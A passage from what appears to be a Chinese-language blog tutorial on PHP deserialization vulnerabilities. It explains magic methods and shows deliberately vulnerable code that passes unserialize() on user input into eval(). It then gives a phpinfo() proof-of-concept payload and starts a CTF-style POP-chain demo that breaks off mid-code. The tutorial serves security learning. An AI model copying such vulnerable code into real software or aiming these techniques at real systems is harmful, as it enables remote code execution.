class="hljs-number">18</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$sex</span> = <span class="hljs-string">&quot;male&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$class_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$class</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$class_ser</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$class_unser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$class_ser</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$class_unser</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210512175857.png" alt="image-20210512175857495"></p><h3 id="魔法方法">魔法方法</h3><p>反序列化漏洞里面会涉及到一些魔法方法</p><h4 id="consruct-和-destruct"><code>__consruct()</code>和<code>__destruct()</code></h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">__construct ( mixed <span class="hljs-params">...</span>$values = <span class="hljs-string">&quot;&quot;</span> ) : <span class="hljs-literal">void</span><br></code></pre></td></tr></table></figure><p>PHP 允许开发者在一个类中定义一个方法作为<strong>构造函数</strong>。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">__destruct ( ) : <span class="hljs-keyword">void</span><br></code></pre></td></tr></table></figure><p>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct()!!!&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct()!!!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$class</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$class</span>);<br></code></pre></td></tr></table></figure><p>以上例程会先输出<code>__construct()!!!</code>然后再输出<code>__destruct()!!!</code>。同时我们要注意到，当我们对一个类对象进行实例化的时候，是不会触发<code>__construct</code>方法的。</p><h4 id="sleep-和-wakeup"><code>__sleep()</code>和 <code>__wakeup()</code></h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">public __sleep ( )<span class="hljs-keyword"> :</span><span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>public __wakeup ( )<span class="hljs-keyword"> :</span> void<br></code></pre></td></tr></table></figure><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。与之相反，<code>unserialize()</code>会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;John&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">18</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$sex</span> = <span class="hljs-string">&quot;male&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep!! &quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-string">&#x27;sex&#x27;</span>);<br>    &#125;   <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup()!! &quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$class_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$class</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$class_ser</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$class_unser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$class_ser</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$class_unser</span>);<br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210512200705.png" alt="image-20210512200705336"></p><h4 id="toString"><code>__toString()</code></h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">public</span> __toString ( ) : <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p><code>__toString()</code>方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 <strong><code>E_RECOVERABLE_ERROR</code></strong> 级别的致命错误。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br></code></pre></td></tr></table></figure><p>以上例程会输出<code>Hello</code></p><p><code>__toString()</code>触发方式比较多：</p><ol><li>echo (<code>$obj</code>) / print(<code>$obj</code>) 打印时会触发</li><li>反序列化对象与字符串连接时</li><li>反序列化对象参与格式化字符串时</li><li>反序列化对象与字符串进行比较时（PHP进行比较的时候会转换参数类型）</li><li>反序列化对象参与格式化SQL语句，绑定参数时</li><li>反序列化对象在经过php字符串函数，如 <code>strlen()</code>、<code>addslashes()</code>时</li><li>在<code>in_array()</code>方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</li><li>反序列化的对象作为 <code>class_exists()</code> 的参数的时候</li></ol><h4 id="属性重载">属性重载</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__set</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$value</span> ) : <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__get</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> ) : <span class="hljs-keyword">mixed</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__isset</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__unset</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> ) : <span class="hljs-keyword">void</span>    <br></code></pre></td></tr></table></figure><p>在给不可访问属性赋值时，<code>__set()</code>会被调用。</p><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p><p>当对不可访问属性调用 <code>isset()</code>或 <code>empty()</code> 时，<code>__isset()</code> 会被调用。</p><p>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">Class User&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$id</span> = <span class="hljs-string">&quot;666&quot;</span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;call __get&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>, <span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call __set&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call __isset&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call __isset&quot;</span>.<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$obj</span>-&gt;id;        <span class="hljs-comment">//输出call __get</span><br><span class="hljs-variable">$obj</span>-&gt;id = <span class="hljs-number">1</span>;        <span class="hljs-comment">//输出call __set</span><br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$obj</span>-&gt;id);        <span class="hljs-comment">//输出call __isset</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$obj</span>-&gt;id));        <span class="hljs-comment">//输出call __unset</span><br></code></pre></td></tr></table></figure><h4 id="call"><code>__call()</code></h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">public __call ( string $name ,<span class="hljs-built_in"> array </span>$arguments )<span class="hljs-keyword"> :</span> mixed<br></code></pre></td></tr></table></figure><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodTest</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-comment">// 注意: $name 的值区分大小写</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Calling object method &#x27;<span class="hljs-subst">$name</span>&#x27; &quot;</span>. <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;, &#x27;</span>, <span class="hljs-variable">$arguments</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodTest</span>;<br><span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">runTest</span>(<span class="hljs-string">&#x27;in object context&#x27;</span>);<br></code></pre></td></tr></table></figure><p>上述例程会输出<code>Calling object method 'runTest' in object context</code></p><h4 id="invoke"><code>__invoke()</code></h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">__invoke ( $... = ? ) : <span class="hljs-type">mixed</span><br></code></pre></td></tr></table></figure><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallableClass</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$x</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CallableClass</span>;<br><span class="hljs-variable">$obj</span>(<span class="hljs-number">5</span>);<br></code></pre></td></tr></table></figure><p>上述例程会输出<code>int(5)</code></p><h2 id="反序列化漏洞">反序列化漏洞</h2><p>反序列化漏洞的成因在于代码中的 <code>unserialize()</code> 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><h3 id="魔法方法的作用">魔法方法的作用</h3><p>从上面的序列化和反序列化的知识我们可以知道，对象的序列化和反序列化只能是里面的属性，也就是说我们通过篡改反序列化的字符串只能获取或控制其他类的属性，这样一来利用面就很窄，因为属性的值都是已经预先设置好的，如果我们想利用类里面的方法呢？这时候魔法方法就派上用场了，魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p><h3 id="魔法方法的简单利用">魔法方法的简单利用</h3><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">L</span>();<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">L</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;function action() in class L&quot;</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br> <br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>首先我们能看到<code>unserialize()</code>函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数<code>__destruct()</code> ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，接下来让我们看一下怎么利用。</p><p>我们看到<code>__destruct()</code>里面只用到了一个属性<code>test</code>，再观察一下哪些地方调用了<code>action()</code>函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然在 <code>Evil</code> 这个类中发现他的 <code>action()</code>函数调用了<code>eval()</code>,那我们的想法就很明确了，只需要将<code>demo</code>这个类中的<code>test</code>属性篡改为 <code>Evil</code>这个类的对象，然后为了<code>eval</code> 能执行命令，我们还要篡改<code>Evil</code>对象的<code>test2</code> 属性，将其改成要执行的命令。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();                     <span class="hljs-comment">//这里将 L 换成 Evil</span><br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;test2 = <span class="hljs-string">&quot;phpinfo();&quot;</span>;            <span class="hljs-comment">//初始化对象 $test2 值</span><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$demo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">demo</span>();<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$demo</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>以上脚本输出：</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513095753.png" alt="image-20210513095753457"></p><p>结果：</p><p><img src="/2022/10/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20210513100005.png" alt="image-20210513100005156"></p><p>这样就完成了一个简单的PHP反序列化漏洞的利用。</p><p><strong>通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者流程</strong>：</p><ol><li>寻找<code>unserialize()</code>函数的参数是否有我们的可控点；</li><li>寻找我们的反序列化的目标，重点寻找存在 <code>wakeup()</code> 或 <code>destruct()</code> 魔法函数的类；</li><li><strong>一层一层</strong>地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的；</li><li>找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击。</li></ol><h2 id="PHP反序列化POP链">PHP反序列化POP链</h2><h3 id="POP链介绍">POP链介绍</h3><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p><h3 id="POP链demo">POP链demo</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&#x27; Welcome&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str[<span 